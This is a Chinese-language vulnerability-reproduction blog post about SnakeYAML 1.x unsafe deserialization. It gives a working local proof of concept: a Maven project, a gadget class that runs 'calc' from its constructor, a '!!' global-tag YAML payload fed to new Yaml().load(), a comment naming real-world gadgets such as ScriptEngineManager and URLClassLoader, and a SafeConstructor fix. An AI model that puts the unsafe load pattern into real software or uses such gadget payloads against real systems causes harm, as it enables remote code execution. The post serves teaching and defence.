+++
description = "漏洞复现"
title = "SnakeYAML  漏洞示例"
date = 2026-09-11T16:12:26+08:00
draft = false
pin = false
+++

# 概述

SnakeYAML 的 `Constructor` 在默认情况下支持任意类实例化，被官方定义为“设计功能”，但被业界广泛视作高危漏洞


# 原理


SnakeYAML 1.x  在使用默认 new Yaml().load(不可信输入) 时， 可通过 YAML 全局标签 !!全限定类名 反射实例化 classpath 上的任意类，并在构造方法中执行代码。

进行编译，然后进行触发漏洞的命令,发现弹出计算机  证明漏洞已经复现成功

mvn -q exec:java "-Dexec.mainClass=com.security.lab.VulnerableDemo"


![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260718233216772.png)

调用链

![](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260718234231926.png)

漏洞源码

漏洞触发的代码段

```c
Yaml yaml = new Yaml();
Object result = yaml.load(yamlText);
```


其中的  pom.xml   所包含的依赖



```xml
<?xml version="1.0" encoding="UTF-8"?>

<project xmlns="http://maven.apache.org/POM/4.0.0"

         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"

         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">

    <modelVersion>4.0.0</modelVersion>

  

    <groupId>com.security.lab</groupId>

    <artifactId>snakeyaml-vuln-demo</artifactId>

    <version>1.0.0</version>

    <packaging>jar</packaging>

    <name>SnakeYAML Vulnerability Demo</name>

    <description>Educational lab: unsafe SnakeYAML deserialization (local only)</description>

  

    <properties>

        <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>

        <maven.compiler.source>1.8</maven.compiler.source>

        <maven.compiler.target>1.8</maven.compiler.target>

        <!-- 1.x 默认允许 !! 标签实例化任意类；2.0+ 默认更安全 -->

        <snakeyaml.version>1.33</snakeyaml.version>

    </properties>

  

    <dependencies>

        <dependency>

            <groupId>org.yaml</groupId>

            <artifactId>snakeyaml</artifactId>

            <version>${snakeyaml.version}</version>

        </dependency>

    </dependencies>

  

    <build>

        <plugins>

            <plugin>

                <groupId>org.apache.maven.plugins</groupId>

                <artifactId>maven-compiler-plugin</artifactId>

                <version>3.11.0</version>

                <configuration>

                    <source>1.8</source>

                    <target>1.8</target>

                    <encoding>UTF-8</encoding>

                </configuration>

            </plugin>

            <plugin>

                <groupId>org.apache.maven.plugins</groupId>

                <artifactId>maven-jar-plugin</artifactId>

                <version>3.3.0</version>

                <configuration>

                    <archive>

                        <manifest>

                            <mainClass>com.security.lab.VulnerableDemo</mainClass>

                        </manifest>

                    </archive>

                </configuration>

            </plugin>

            <plugin>

                <groupId>org.codehaus.mojo</groupId>

                <artifactId>exec-maven-plugin</artifactId>

                <version>3.1.0</version>

                <configuration>

                    <mainClass>com.security.lab.VulnerableDemo</mainClass>

                </configuration>

            </plugin>

        </plugins>

    </build>

</project>
```

EvilGadget.java


```java
package com.security.lab;

  

/**

 * 教学用 gadget：被 SnakeYAML 通过 !! 标签实例化时弹出计算器。

 * 仅用于本地安全实验。

 */

public class EvilGadget {

  

    public EvilGadget() {

        popCalc();

    }

  

    public EvilGadget(String msg) {

        popCalc();

    }

  

    private static void popCalc() {

        System.out.println("[VULN TRIGGERED] 正在启动 calc ...");

        try {

            // Windows：弹出计算器

            Runtime.getRuntime().exec("calc");

        } catch (Exception e) {

            System.err.println("[!] 启动 calc 失败: " + e.getMessage());

            e.printStackTrace();

        }

    }

}
```


VulnerableDemo.java

```java
package com.security.lab;

  

import org.yaml.snakeyaml.Yaml;

  

import java.io.FileInputStream;

import java.io.InputStream;

import java.nio.charset.StandardCharsets;

import java.nio.file.Files;

import java.nio.file.Paths;

  

/**

 * 最简 SnakeYAML 漏洞触发演示（本地教学）。

 *

 * 根因：

 *   Yaml yaml = new Yaml();

 *   yaml.load(untrustedInput);

 * 在 SnakeYAML 1.x 中会按全局 Tag 解析 !!全限定类名，并反射实例化该类。

 *

 * 真实攻防中攻击者可换用 JDK/第三方 gadget（如 ScriptEngineManager + URLClassLoader 等）

 * 达到 RCE；本 lab 仅用本地 EvilGadget 证明“构造方法被调用”。

 *

 * 运行（项目根目录）：

 *   mvn -q compile exec:java

 *   mvn -q compile exec:java -Dexec.args="payloads/evil.yml"

 *   mvn -q compile exec:java -Dexec.mainClass=com.security.lab.SafeDemo

 */

public class VulnerableDemo {

  

    public static void main(String[] args) throws Exception {

        System.out.println("=== SnakeYAML 不安全反序列化演示 (VulnerableDemo) ===");

        System.out.println("SnakeYAML 版本见 pom.xml (org.yaml:snakeyaml)");

        System.out.println();

  

        String yamlText;

        if (args.length > 0) {

            String path = args[0];

            System.out.println("[*] 从文件读取 YAML: " + path);

            byte[] bytes = Files.readAllBytes(Paths.get(path));

            yamlText = new String(bytes, StandardCharsets.UTF_8);

        } else {

            // 内嵌最简 payload：强制实例化 EvilGadget

            yamlText =

                    "!!com.security.lab.EvilGadget\n";

            System.out.println("[*] 使用内嵌 payload（无参构造）:");

            System.out.println("----");

            System.out.print(yamlText);

            System.out.println("----");

        }

  

        // ========== 漏洞点：对不可信输入使用默认 Constructor ==========

        Yaml yaml = new Yaml();

        System.out.println("[*] 调用 new Yaml().load(...)  ...");

        Object result = yaml.load(yamlText);

        // ============================================================

  

        System.out.println("[*] load() 返回对象: " + result);

        System.out.println("[*] 返回类型: " + (result == null ? "null" : result.getClass().getName()));

        System.out.println();

        System.out.println("提示: 若弹出计算器，说明漏洞已触发。对比安全写法请运行 SafeDemo。");

    }

}
```


后面的是安全的代码示例

SafeDemo.java

```java
package com.security.lab;

  

import org.yaml.snakeyaml.LoaderOptions;

import org.yaml.snakeyaml.Yaml;

import org.yaml.snakeyaml.constructor.SafeConstructor;

  

/**

 * 安全对照：使用 SafeConstructor，禁止任意类实例化。

 *

 * SnakeYAML 1.x: new Yaml(new SafeConstructor())

 * SnakeYAML 2.x: 默认更严格，并推荐 LoaderOptions + 明确允许的类型

 */

public class SafeDemo {

  

    public static void main(String[] args) {

        System.out.println("=== SnakeYAML 安全加载演示 (SafeDemo) ===");

        System.out.println();

  

        String malicious =

                "!!com.security.lab.EvilGadget\n";

  

        System.out.println("[*] 恶意 YAML:");

        System.out.print(malicious);

        System.out.println();

  

        try {

            // SnakeYAML 1.33 支持带 LoaderOptions 的 SafeConstructor

            LoaderOptions options = new LoaderOptions();

            Yaml yaml = new Yaml(new SafeConstructor(options));

            Object result = yaml.load(malicious);

            System.out.println("[*] 意外成功? result=" + result);

        } catch (Exception e) {

            System.out.println("[+] 预期失败：SafeConstructor 拒绝全局 Tag / 任意类");

            System.out.println("[+] 异常类型: " + e.getClass().getName());

            System.out.println("[+] 信息: " + e.getMessage());

        }

  

        System.out.println();

        System.out.println("[*] 安全用法仍可加载基础类型:");

        Yaml safe = new Yaml(new SafeConstructor(new LoaderOptions()));

        Object map = safe.load("name: alice\nage: 18\n");

        System.out.println("[+] 正常 Map: " + map);

    }

}
```











